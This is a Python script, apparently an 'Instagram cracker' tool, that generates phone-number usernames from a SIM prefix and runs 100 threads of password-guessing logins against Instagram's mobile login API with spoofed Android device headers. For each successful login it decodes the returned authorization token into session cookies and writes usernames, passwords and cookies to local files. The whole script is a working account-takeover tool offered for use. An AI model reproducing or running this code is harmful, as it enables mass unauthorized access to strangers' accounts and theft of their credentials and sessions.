#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import hashlib
import uuid
import time
import urllib.parse
import random
import requests
import re
import json
import base64
import random
import sys
import time
import hashlib
import uuid
import urllib.request
import requests
import string
import os
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

# Global variables
loop = 0
oks = []
cps = []
idz = []
counter_lock = threading.Lock()
success_lock = threading.Lock()

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def linex():
    print('='*56)

def crack(uid, password_list, total_count):
    global loop
    colors = ["\033[1;90m", "\033[1;91m", "\033[1;92m", "\033[1;93m", "\033[1;94m", "\033[1;95m", "\033[1;96m"]
    
    try:
        for pw in password_list:
            color = random.choice(colors)  # Fixed: was IG.choice()
            with counter_lock:
                progress = loop
                success_count = len(oks)
                fail_count = len(cps)
                percentage = (progress / float(total_count) * 100) if total_count > 0 else 0
            
            sys.stdout.write(f"\r{color}[TEAM GS] {progress} \033[1;92m{success_count}\033[1;97m/\033[1;91m{fail_count} \033[1;97m[\033[1;93m{percentage:.1f}%\033[1;92m] ")
            sys.stdout.flush()
            
            session = requests.Session()
            device_id = f"android-{uuid.uuid4().hex[:16]}"
            family_device_id = str(uuid.uuid4())
            first_hash = hashlib.md5()
            first_hash.update(uid.encode('utf-8') + pw.encode('utf-8'))
            first_hex = first_hash.hexdigest()
            second_hash = hashlib.md5()
            second_hash.update(first_hex.encode('utf-8') + '12345'.encode('utf-8'))
            android_id_hash = second_hash.hexdigest()[:16]
            
            useragent = "Instagram 309.0.0.28.114 Android (29/10; 380dpi; 1080x2080; OnePlus; GM1903; OnePlus7; qcom; en_US; 439209455)"
            headers = {
                'host': 'i.instagram.com',
                'x-ig-app-locale': 'in_ID',
                'x-ig-device-locale': 'in_ID',
                'x-ig-mapped-locale': 'id_ID',
                'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-3',
                'x-pigeon-rawclienttime': f'{time.time():.3f}',
                'x-bloks-version-id': 'c55a52bd095e76d9a88e2142eaaaf567c093da6c0c7802e7a2f101603d8a7d49',
                'x-ig-www-claim': '0',
                'x-bloks-is-prism-enabled': 'false',
                'x-bloks-is-layout-rtl': 'false',
                'x-ig-device-id': device_id,
                'x-ig-family-device-id': family_device_id,
                'x-ig-android-id': f'android-{android_id_hash}',
                'x-fb-connection-type': 'MOBILE.LTE',
                'x-ig-connection-type': 'MOBILE(LTE)',
                'x-ig-capabilities': '3brTv10=',
                'priority': 'u=3',
                'user-agent': useragent,
                'accept-language': 'id-ID, en-US',
                'x-mid': '',
                'ig-intended-user-id': '0',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'x-fb-http-engine': 'Liger',
                'x-fb-client-ip': 'True',
                'x-fb-server-cluster': 'True',
                'x-ig-bandwidth-speed-kbps': str(random.randint(100, 300)),  # Fixed: was IG.randint()
                'x-ig-bandwidth-totalbytes-b': str(random.randint(500000, 900000)),  # Fixed: was IG.randint()
                'x-ig-bandwidth-totaltime-ms': str(random.randint(1000, 9000)),  # Fixed: was IG.randint()
                'x-ig-app-id': '3419628305025917',
                'connection': 'keep-alive'
            }
            
            timestamp = int(time.time())
            encoded_username = urllib.parse.quote(uid)
            encoded_password = urllib.parse.quote(pw)
            encrypted_password = f'#PWD_INSTAGRAM:0:{timestamp}:{encoded_password}'
            
            params_dict = {
                "client_input_params": {
                    "device_id": f"android-{android_id_hash}",
                    "login_attempt_count": 1,
                    "secure_family_device_id": "",
                    "machine_id": "",
                    "accounts_list": [],
                    "auth_secure_device_id": "",
                    "password": encrypted_password,
                    "family_device_id": family_device_id,
                    "fb_ig_device_id": [],
                    "device_emails": [],
                    "try_num": 3,
                    "event_flow": "login_manual",
                    "event_step": "home_page",
                    "openid_tokens": {},
                    "client_known_key_hash": "",
                    "contact_point": encoded_username,
                    "encrypted_msisdn": ""
                },
                "server_params": {
                    "username_text_input_id": "p5hbnc:46",
                    "device_id": f"android-{android_id_hash}",
                    "should_trigger_override_login_success_action": 0,
                    "server_login_source": "login",
                    "waterfall_id": str(uuid.uuid4()),
                    "login_source": "Login",
                    "INTERNAL__latency_qpl_instance_id": 152086072800150,
                    "reg_flow_source": "login_home_native_integration_point",
                    "is_platform_login": 0,
                    "is_caa_perf_enabled": 0,
                    "credential_type": "password",
                    "family_device_id": family_device_id,
                    "INTERNAL__latency_qpl_marker_id": 36707139,
                    "offline_experiment_group": "caa_iteration_v3_perf_ig_4",
                    "INTERNAL_INFRA_THEME": "harm_f",
                    "password_text_input_id": "p5hbnc:47",
                    "ar_event_source": "login_home_page"
                }
            }
            
            params_json = json.dumps(params_dict)
            encoded_params = urllib.parse.quote(params_json)
            encode = f'params={encoded_params}&bk_client_context=%7B%22bloks_version%22%3A%225f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73%22%2C%22styles_id%22%3A%22instagram%22%7D&bloks_versioning_id=c55a52bd095e76d9a88e2142eaaaf567c093da6c0c7802e7a2f101603d8a7d49'
            headers['content-length'] = str(len(encode))
            
            url = 'https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/'
            response = session.post(url, data=encode, headers=headers, allow_redirects=True, timeout=10)          
            if 'logged_in_user' in response.text:
                if match := re.search(r'"IG-Set-Authorization":\s*"(.*?)"', response.text.replace('\\', '')):
                    try:
                        decoded = json.loads(base64.urlsafe_b64decode(match.group(1).split('Bearer IGT:2:')[1].ljust(4, '=')))
                        cookie_str = ';'.join(f'{k}={v}' for k,v in decoded.items())
                        print(f"\r\033[1;92m [IG-OK] {uid} | {pw} / {cookie_str}")
                        try:
                            os.makedirs("TEAM_GS", exist_ok=True)
                            with open("TEAM_GS/IG_OK.txt", "a") as f:
                                f.write(f"{uid}|{pw} {cookie_str}\n")
                        except Exception:
                            pass
                        
                        with success_lock:
                            oks.append(uid)
                        return True     
                    except Exception as e:
                        pass
                else:
                    pass
                    
            elif 'challenge_required' in response.text:
                cps.append(uid)
                continue
            elif 'checkpoint_required' in response.text:
                print(f"\r\033[1;91m [IG-CP] {uid} | {pw}")
                with open("/sdcard/IG_CP.txt", "a") as f:
                    f.write(uid+"|"+pw+"\n")
                cps.append(uid)
                continue
            else:
                continue
                
        with counter_lock:
            loop += 1
            
    except Exception as e:
        return False
    
    return False


def generate_IG_ids(limit):
    idz.clear()
    for _ in range(limit):
        IG_id = "".join(random.choice(string.digits) for _ in range(6))
        idz.append(IG_id)
    return idz

def get_password_patterns(uid):
    return [
        uid[:6], uid[:7], uid[:8], uid[4:], uid, uid[2:], '57273200','57273200'
    ]

def IG_number():
    clear()
    print(f"{'='*56}")
    print(f"     INSTAGRAM IG NUMBER CLONING")
    print(f"{'='*56}")
    print(f" [•] Available Codes: 7679, 7872, 9883, 8017")
    print(f" [•] Suggested Limits: 1000, 2000, 5000, 10000")
    linex()
    
    code = input(f" [?] Enter SIM Code: ").strip()
    
    try:
        limit = int(input(f" [?] Enter Limit: "))
        if limit <= 0:
            limit = 99999
    except ValueError:
        limit = 99999
    
    print(f" [*] Generating {limit} IG IDs...")
    generate_IG_ids(limit)
    
    global loop, oks, cps
    with counter_lock:
        loop = 0
    with success_lock:
        oks.clear()
    cps.clear()
    
    clear()
    print(f"{'='*56}")
    print(f"     STARTING INSTAGRAM CLONING")
    print(f"{'='*56}")
    print(f' (✓) Total IDs Generated: {len(idz):,}')
    print(f' (+) SIM Code: {code}')
    print(f" (!) Tip: Use Flight Mode for better speed!")
    print(f' [•] Results will be saved to: TEAM GS/IG_OK.txt')
    linex()
    
    start_time = time.time()
    
    with ThreadPoolExecutor(max_workers=100) as executor:
        futures = []
        
        for IG_id in idz:
            uid = code + IG_id
            password_patterns = get_password_patterns(uid)
            future = executor.submit(crack, uid, password_patterns, len(idz))
            futures.append(future)
        
        for future in as_completed(futures):
            future.result()
    
    end_time = time.time()
    execution_time = end_time - start_time
    
    linex()
    print(f"{'='*56}")
    print(f" [✓] PROCESS COMPLETED SUCCESSFULLY!")
    print(f"{'='*56}")
    print(f" [📊] Total Accounts Tested: {len(idz):,}")
    print(f" [✅] Successful Logins: {len(oks)}")
    print(f" [❌] Failed Attempts: {len(cps)}")
    print(f" [⏱️] Execution Time: {execution_time:.2f} seconds")
    print(f" [🚀] Speed: {len(idz)/execution_time:.2f} IDs/second")
    
    if len(oks) > 0:
        print(f" [🎉] SUCCESS! Found {len(oks)} working accounts!")
    else:
        print(f" [😞] No successful logins found this time.")
    
    linex()
    input(f" [!] Press Enter to return to menu...")

def menu():
    while True:
        clear()
        print(f"{'='*56}")
        print(f"     INSTAGRAM CRACKER v3.0 - ENHANCED")
        print(f"{'='*56}")
        print(f" [1] IG Number Cloning")
        print(f" [2] View Statistics")
        print(f" [3] Exit Program")
        print(f"{'='*60}")
        
        choice = input(f" [?] Select Option: ").strip()
        
        if choice == '1':
            IG_number()
        elif choice == '2':
            clear()
            print(f"{'='*56}")
            print(f"     PROGRAM STATISTICS")
            print(f"{'='*56}")
            print(f" [✅] Total Successful: {len(oks)}")
            print(f" [❌] Total Failed: {len(cps)}")
            print(f" [📝] Generated IDs: {len(idz)}")
            print(f" [🔄] Current Progress: {loop}")
            linex()
            input(f" [!] Press Enter to continue...")
        elif choice == '3':
            clear()
            print(f"{'='*56}")
            print(f"     GOODBYE! THANKS FOR USING OUR TOOL!")
            print(f"{'='*56}")
            print(f" [!] Results saved in: TEAM GS/IG_OK.txt")
            print(f" [!] Total successful accounts: {len(oks)}")
            time.sleep(3)
            break
        else:
            print(f" [!] Invalid option! Please choose 1, 2, or 3.")
            time.sleep(2)

if __name__ == "__main__":
    try:
        menu()
    except KeyboardInterrupt:
        clear()
        print(f"\n[!] Program interrupted by user. Goodbye!")
        sys.exit(0)
    except Exception as e:
        clear()
        print(f"\n[!] Fatal error occurred: {e}")
        sys.exit(1)
